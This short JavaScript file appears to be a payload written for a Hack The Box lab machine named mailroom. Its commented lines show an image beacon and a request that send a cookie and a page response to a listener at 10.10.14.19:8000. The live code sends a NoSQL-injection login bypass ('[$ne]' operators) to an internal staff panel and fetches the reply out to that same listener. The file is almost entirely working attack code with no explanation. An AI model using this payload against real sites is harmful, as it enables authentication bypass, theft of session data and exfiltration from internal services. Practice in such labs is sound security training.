// var i = new Image;
// i.src = "http://10.10.14.19:8000/xss";

// x = new XMLHttpRequest;
// x.onload = function() {
    // fetch("http://10.10.14.19:8000/" + this.responseText);
// };
// x.open("GET", "http://staff-review-panel.mailroom.htb/?+document.cookie");
// x.send();

var email = "email[$ne]=toto";
var password = "password[$ne]=toto";
var body = email + "&" + password;

x = new XMLHttpRequest;
x.onload = function() {
    fetch("http://10.10.14.19:8000/" + this.responseText);
};
x.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", false);
x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
x.send(body);